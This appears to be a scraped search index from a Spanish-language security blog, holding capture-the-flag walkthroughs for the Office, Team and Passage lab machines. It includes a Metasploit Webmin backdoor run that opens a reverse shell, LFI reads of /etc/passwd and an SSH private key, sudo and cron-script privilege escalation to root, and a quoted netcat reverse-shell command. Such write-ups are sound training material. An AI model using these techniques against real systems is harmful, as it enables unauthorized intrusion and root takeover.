{ visibility: hidden; animation: 2s noscript-fadein; animation-delay: 1s; text-align: center; animation-fill-mode: forwards; } @keyframes noscript-fadein { 0% { opacity: 0; } 100% { visibility: visible; opacity: 1; } } \u0026lt;/style\u0026gt; \u0026lt;div data-noscript\u0026gt; \u0026lt;div class=\u0026#34;fa fa-3x fa-exclamation-triangle margined-top-20 text-danger\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h2\u0026gt;JavaScript is disabled\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Please enable javascript and refresh the page\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/noscript\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Login to Webmin\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;/images/favicon-webmin.ico\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;/unauthenticated/css/bundle.min.css?1919999999999911\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script\u0026gt;setTimeout(function(){var a=document.querySelectorAll(\u0026#39;input[type=\u0026#34;password\u0026#34;]\u0026#39;);i=0; Realizamos una busqueda de posibles vulnerabilidades y exploits para esta version y encontramos un exploit de metasploit que podria afectar a la version de webmin ya que no necesita de credenciales y afecta a versiones 1.920. Configuramos dicho exploit y logramos obtener una shell con usuario root y nuestra flag system.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 msf6 exploit(linux/http/webmin_backdoor) \u0026gt; run [*] Started reverse TCP handler on 10.10.2.155:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target is vulnerable. [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.2.155:4444 -\u0026gt; 172.31.3.1:42076) at 2021-03-23 22:09:01 -0400 which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@office:/usr/share/webmin/# whoami;id;pwd whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /usr/share/webmin root@office:/usr/share/webmin/# cd /root cd /root root@office:~# ls ls system.txt root@office:~# cat system.txt cat system.txt 39bd970[... REDACTED ...]e6fe6130 root@office:~# ","description":"Office es una maquina de CyberSecLabs, enumeramos subdominios para toparnos con una lista de usuarios y además encontramos una vulnerabilidad LFI que nos permitio leer y crackear hashes para ingresar a WordPress. Cambiamos al siguiente usuario con Sudo y Bash. Finalmente obtuvimos el puerto de Webmin ejecutando un Tunnel con Chisel que nos permitio explotar una vulnerabilidad para acceder como usuario root.","id":71,"section":"posts","tags":["lfi","wordpress","wpscan","php","chisel","wfuzz","rce","webmin"],"title":"CyberSecLabs - Office","uri":"https://sckull.github.io/posts/office/"},{"content":"\rTeam es una maquina de TryHackMe, encontramos credenciales en el servicio FTP que nos llevaron a un nuevo subdominio donde descubrimos un LFI para luego enumerar los archivos y encontrar una clave privada para acceder por SSH. Cambiamos al siguiente usuario tras ejecutar un script en bash. Escalamos privilegios editando un ficher utilizado por un CronJob.\nRoom Titulo Team Descripción Beginner friendly boot2root machine Puntos 60 Dificultad Facil Maker dalemazza NMAP Escaneo de puertos con nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Nmap 7.91 scan initiated Tue Mar 23 02:30:37 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.65.146 Nmap scan report for 10.10.65.146 (10.10.65.146) Host is up (0.27s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Tue Mar 23 02:31:41 2021 -- 1 IP address (1 host up) scanned in 63.96 seconds # Nmap 7.91 scan initiated Tue Mar 23 02:32:33 2021 as: nmap -p 21,22,80 -sV -sC -oN serviceports 10.10.65.146 Nmap scan report for 10.10.65.146 (10.10.65.146) Host is up (0.35s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA) | 256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA) |_ 256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 23 02:32:51 2021 -- 1 IP address (1 host up) scanned in 18.06 seconds HTTP Encontramos en la pagina web el dominio team.thm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 HTTP/1.1 200 OK Date: Tue, 23 Mar 2021 06:36:28 GMT Server: Apache/2.4.29 (Ubuntu) Last-Modified: Sat, 16 Jan 2021 14:11:21 GMT ETag: \u0026#34;2c66-5b90510390674\u0026#34; Accept-Ranges: bytes Content-Length: 11366 Vary: Accept-Encoding Content-Type: text/html \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; \u0026lt;!-- Modified from the Debian original for Ubuntu Last updated: 2014-03-19 See: https://launchpad.net/bugs/1288690 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;team.thm\u0026#39; to your hosts!\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34; media=\u0026#34;screen\u0026#34;\u0026gt; * { margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; } GOBUSTER Realizamos una enumeracion a la pagina del dominio encontrado, vemos la carpeta /script/ y /assets/, a las cuales se realizó una enumeracion recursiva.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #team.thm /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /scripts (Status: 301) /server-status (Status: 403) #team.thm/assets/ /css (Status: 301) /fonts (Status: 301) /js (Status: 301) #team.thm/scripts/ /script.txt (Status: 200) Encotramos un archivo de texto el cual contiene lo que pareciera ser un script para un \u0026ldquo;servidor\u0026rdquo; ftp. Además contiene un comentario en el que indica que existe el mismo archivo con una extension diferente y que contiene credenciales en este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://team.thm/scripts/script.txt #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in WFUZZ Realizamos una enumeracion de extensiones utilizando WFUZZ con un wordlist de extensiones.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ wfuzz -c -w fuzz.txt --sc 200 http://team.thm/scripts/script.FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://team.thm/scripts/script.FUZZ Total requests: 4833 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000003247: 200 18 L 44 W 466 Ch \u0026#34;old\u0026#34; Total time: 0 Processed Requests: 4833 Filtered Requests: 4832 Requests/sec.: 0 Encontramos la extension .old. En el archivo encontramos un usuario y contraseña del servicio ftp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://team.thm/scripts/script.old #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; ftpuser read -sp \u0026#34;Enter Username Password: \u0026#34; T3@m$h@r3 echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit FTP Ingresamos al servicio FTP con las credenciales encontradas. Vemos un archivo el cual contiene una nota del usuario Dale, el cual indica que hay una pagina web PHP en desarrollo y se encuentra bajo el subdominio .dev, además debemos de colocar nuestra clave ìd_rsa en el archivo de configuracion.\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ cat New_site.txt Dale I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at \u0026#34;.dev\u0026#34; within our domain. Also as per the team policy please make a copy of your \u0026#34;id_rsa\u0026#34; and place this in the relevent config file. Gyles DEV DALE SITE - LFI Agregamos a nuestro archivo /etc/hosts el subdominio dev.team.thm. En este subdominio encontramos una pagina que contiene una direccion.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;UNDER DEVELOPMENT\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Site is being built\u0026lt;a href=script.php?page=teamshare.php \u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;Place holder link to team share\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; En la direccion o pagina obtiene un parametro en la variable page, despues de modificar el valor encontramos que existe una vulnerabilidad LFI.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=teamshare.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Team Share\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Place holder for future team share \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=index.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;UNDER DEVELOPMENT\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Site is being built\u0026lt;a href=script.php?page=teamshare.php \u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;Place holder link to team share\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/passwd | head root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin Realizamos la enumeracion de los usuarios con carpeta principal con lo cual logramos obtener nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/passwd |grep \u0026#34;/home\u0026#34; syslog:x:102:106::/home/syslog:/usr/sbin/nologin dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles:/bin/bash ftpuser:x:1002:1002::/home/ftpuser:/bin/sh ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/home/dale/user.txt THM{[...REDACTED...]} DALE - USER Despues de un intento fallido de obtener las claves privadas de los usuarios existentes, utilizamos un wordlist con WFUZZ para enumerar archivos que nos ayuden a obtener acceso a la maquina. Logramos obtener una lista de archivos, con los cuales logramos obtener informacion de la maquina. Realizando una lectura de cada archivo encontramos en el archivo /etc/ssh/sshd_config la clave privada del usuario Dale.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ wfuzz -c -w lfi_paths.txt --hh 1 http://dev.team.thm/script.php?page=FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://dev.team.thm/script.php?page=FUZZ Total requests: 1014 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000015: 200 230 L 1119 W 7313 Ch \u0026#34;/etc/apache2/apache2.conf\u0026#34; [... REDACTED ...] 000000162: 200 13 L 17 W 383 Ch \u0026#34;/etc/os-release\u0026#34; 000000164: 200 16 L 59 W 553 Ch \u0026#34;/etc/pam.conf\u0026#34; 000000197: 200 19 L 113 W 736 Ch \u0026#34;/etc/resolv.conf\u0026#34; 000000184: 200 28 L 97 W 582 Ch \u0026#34;/etc/profile\u0026#34; 000000165: 200 34 L 42 W 1698 Ch \u0026#34;/etc/passwd\u0026#34; 000000166: 200 34 L 42 W 1696 Ch \u0026#34;/etc/passwd-\u0026#34; 000000219: 200 12 L 70 W 420 Ch \u0026#34;/etc/security/sepermit.conf\u0026#34; 000000220: 200 66 L 412 W 2180 Ch \u0026#34;/etc/security/time.conf\u0026#34; 000000216: 200 74 L 499 W 2973 Ch \u0026#34;/etc/security/pam_env.conf\u0026#34; 000000214: 200 29 L 217 W 1441 Ch \u0026#34;/etc/security/namespace.conf\u0026#34; 000000213: 200 57 L 347 W 2151 Ch \u0026#34;/etc/security/limits.conf\u0026#34; 000000210: 200 107 L 663 W 3636 Ch \u0026#34;/etc/security/group.conf\u0026#34; 000000206: 200 123 L 802 W 4621 Ch \u0026#34;/etc/security/access.conf\u0026#34; 000000260: 200 160 L 955 W 5937 Ch \u0026#34;/etc/vsftpd.conf\u0026#34; 000000252: 200 5 L 45 W 404 Ch \u0026#34;/etc/updatedb.conf\u0026#34; 000000248: 200 2 L 1 W 15 Ch \u0026#34;/etc/timezone\u0026#34; 000000246: 200 78 L 339 W 2684 Ch \u0026#34;/etc/sysctl.conf\u0026#34; 000000240: 200 169 L 447 W 5990 Ch \u0026#34;/etc/ssh/sshd_config\u0026#34; 000000379: 200 59 L 114 W 538 Ch \u0026#34;/proc/devices\u0026#34; [... REDACTED ...] 000000630: 200 89 L 467 W 3029 Ch \u0026#34;/usr/share/adduser/adduser.conf\u0026#34; Total time: 0 Processed Requests: 1014 Filtered Requests: 933 Requests/sec.: 0 Utilizamos la clave privada con lo que logramos obtener una shell con el usuario Dale.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config [... REDACTED ..] ----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE [.. REDACTED ..] #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH #-----END OPENSSH PRIVATE KEY----- ┌──(kali㉿kali)-[~/thm/teamcw] └─$ ssh -i dale_id_rsa dale@10.10.151.176 130 ⨯ Last login: Mon Jan 18 10:51:32 2021 dale@TEAM:~$ whoami; id; pwd dale uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors) /home/dale dale@TEAM:~$ GYLES - USER Realizamos una pequeña enumeracion y vemos que el usuario actual tiene permisos root mediante sudo ejecutar el script admmin_checks, además tiene permisos de lectura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 dale@TEAM:~$ sudo -l -l Matching Defaults entries for dale on TEAM: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dale may run the following commands on TEAM: Sudoers entry: RunAsUsers: gyles Options: !authenticate Commands: /home/gyles/admin_checks dale@TEAM:~$ ls -lah /home/gyles/admin_checks -rwxr--r-- 1 gyles editors 399 Jan 15 21:52 /home/gyles/admin_checks dale@TEAM:~$ groups dale adm cdrom sudo dip plugdev lxd lpadmin sambashare editors El script realiza la ejecucion del comando date solo si este se le pasa, en tal caso imprime una fecha y con este crea un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 dale@TEAM:~$ cat /home/gyles/admin_checks #!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error # Pregunta por date printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null # Ejecuta date date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34; Para tomar ventaja de esto pasamos /bin/bash en lugar de date para obtener una shell con el usuario gyles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: batman Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami;id gyles uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin) which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; gyles@TEAM:~$ pwd /home/dale gyles@TEAM:~$ cd /home gyles@TEAM:/home$ cd gyles gyles@TEAM:/home/gyles$ ls -lah total 48K drwxr-xr-x 6 gyles gyles 4.0K Jan 17 19:47 . drwxr-xr-x 5 root root 4.0K Jan 15 20:21 .. -rwxr--r-- 1 gyles editors 399 Jan 15 21:52 admin_checks -rw------- 1 gyles gyles 5.6K Jan 17 20:34 .bash_history -rw-r--r-- 1 gyles gyles 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 gyles gyles 3.7K Apr 4 2018 .bashrc drwx------ 2 gyles gyles 4.0K Jan 15 21:38 .cache drwx------ 3 gyles gyles 4.0K Jan 15 21:38 .gnupg drwxrwxr-x 3 gyles gyles 4.0K Jan 15 21:51 .local -rw-r--r-- 1 gyles gyles 807 Apr 4 2018 .profile drwx------ 2 gyles gyles 4.0K Jan 15 21:43 .ssh -rw-r--r-- 1 gyles gyles 0 Jan 17 15:05 .sudo_as_admin_successful PRIVILEGE ESCALATION Realizamos una enumeracion con el usuario Gyles y encontramos en el archivo .bash_history que se estuvieron editando varios scripts y ejecucion de shell inversas. Aparentemente algunos de los archivos son utilizados para restaurar los archivos de las paginas team.thm y dev.team.thm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 gyles@TEAM:/home/gyles$ cat .bash_history|grep \u0026#34;.sh\u0026#34; cat /etc/shells chsh -s /bin/bash nc 192.168.88.128 -e /bin/bash nc 192.168.88.128 \u0026lt; /bin/bash [ .. REDACTED ..] cat /usr/local/sbin/dev.backup.sh cat /usr/local/bin/main_backup.sh cat /opt/admin_stuff/script.sh nano /usr/local/sbin/dev.backup.sh sudo nano /usr/local/sbin/dev.backup.sh sudo nano /opt/admin_stuff/script.sh diff /usr/local/sbin/dev_backup.sh /usr/local/bin/main_backup.sh sudo chmod +x dev_backup.sh sudo rm dev.backup.sh nano dev_backup.sh nano /usr/local/bin/main_backup.sh Ejecutamos pspy para verificar si existe un cron para la ejecucion de estos scripts. Observamos que se ejecutan varios scripts: /opt/admin_stuff/script.sh, /usr/local/sbin/dev_backup.sh y /usr/local/bin/main_backup.sh.\n1 2 3 4 5 6 7 8 9 10 11 2021/03/23 08:43:01 CMD: UID=0 PID=1569 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1568 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1567 | /usr/sbin/CRON -f 2021/03/23 08:43:01 CMD: UID=0 PID=1570 | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/ 2021/03/23 08:43:01 CMD: UID=0 PID=1571 | /bin/bash /usr/local/sbin/dev_backup.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1572 | cp -r /var/www/dev.team.thm/index.php /var/www/dev.team.thm/script.php /var/www/dev.team.thm/teamshare.php /var/backups/www/dev/ 2021/03/23 08:43:48 CMD: UID=0 PID=1573 | ps -e -o pid,ppid,state,command 2021/03/23 08:44:01 CMD: UID=0 PID=1576 | /bin/bash /usr/local/bin/main_backup.sh 2021/03/23 08:44:01 CMD: UID=0 PID=1575 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:44:01 CMD: UID=0 PID=1574 | /usr/sbin/CRON -f 2021/03/23 08:44:01 CMD: UID=0 PID=1577 | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/ Al verificar los permisos de los scripts vemos que tenemos permisos de lectura, escritura y ejecucion en el archivo /usr/local/bin/main_backup.sh.\n1 2 3 4 5 6 7 8 9 gyles@TEAM:/home/gyles$ ls -lah /opt/admin_stuff/script.sh -rwxr--r-- 1 root root 200 Jan 17 20:38 /opt/admin_stuff/script.sh gyles@TEAM:/home/gyles$ ls -lah /usr/local/sbin/dev_backup.sh -rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh gyles@TEAM:/home/gyles$ ls -lah /usr/local/bin/main_backup.sh -rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh gyles@TEAM:/home/gyles$ id uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin) gyles@TEAM:/home/gyles$ Agregamos un comando para que este le de permisos SUID a bash.\n1 echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /usr/local/bin/main_backup.sh Esperamos a que el cron se ejecute, luego de unos segundos obtiene los permisos.\ngyles@TEAM:/home/gyles$ ls -lah /bin/bash\r-rwxr-xr-x 1 root root 1.1M Apr 4 2018 /bin/bash\rgyles@TEAM:/home/gyles$ echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /usr/local/bin/main_backup.sh\rgyles@TEAM:/home/gyles$ ls -lah /bin/bash\r-rwsr-xr-x 1 root root 1.1M Apr 4 2018 /bin/bash Ejecutamos bash -p con lo que logramos obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 gyles@TEAM:/home/gyles$ bash -p bash-4.4# whoami root bash-4.4# cd bash-4.4# whoami; id; pwd root uid=1001(gyles) gid=1001(gyles) euid=0(root) groups=1001(gyles),1003(editors),1004(admin) /home/dale bash-4.4# cd /root bash-4.4# ls root.txt bash-4.4# cat root.txt THM{[... REDACTED ...]} bash-4.4# ","description":"Team es una maquina de TryHackMe, encontramos credenciales en el servicio FTP que nos llevaron a un nuevo subdominio donde descubrimos un LFI para luego enumerar los archivos y encontrar una clave privada para acceder por SSH. Cambiamos al siguiente usuario tras ejecutar un script en bash. Escalamos privilegios editando un ficher utilizado por un CronJob.","id":72,"section":"posts","tags":["lfi","suid","php","gobuster","wfuzz"],"title":"TryHackMe - Team","uri":"https://sckull.github.io/posts/teamcw/"},{"content":"\rPassage es una maquina de HackTheBox descubrimos CuteNews en donde encontramos credenciales codificadas en base64-\u0026gt;MD5, además ejecutamos una shell inversa para tener acceso. Crackeamos los hashes encontrados para acceder al siguiente usuario. Encontramos la clave publica ya registrada en authorized_keys lo que nos dio acceso a otro usuario. Tras enumerar los archivos y procesos encontramos USBCreator D-Bus Interface que además descubrimos que puede crear archivos como root lo que aprovechamos para registrar nuestra clave publica en los archivos SSH de root para obtener privilegios como root.\nInformacion de la Maquina Nombre Passage OS Linux Puntos 30 Dificultad Media IP 10.10.10.206 Maker ChefByzen\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.3, 6.4, 6.7, 3.3, 3.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 10, 8, 2, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Fri Sep 25 01:31:49 2020 as: nmap -Pn -p- --min-rate 1000 -oN allports 10.10.10.206 Warning: 10.10.10.206 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.11s latency). Not shown: 63942 closed ports, 1591 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Sep 25 01:34:10 2020 -- 1 IP address (1 host up) scanned in 140.93 seconds # Nmap 7.80 scan initiated Fri Sep 25 01:34:44 2020 as: nmap -p22,80 -sC -sV -o serviceAllports 10.10.10.206 Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 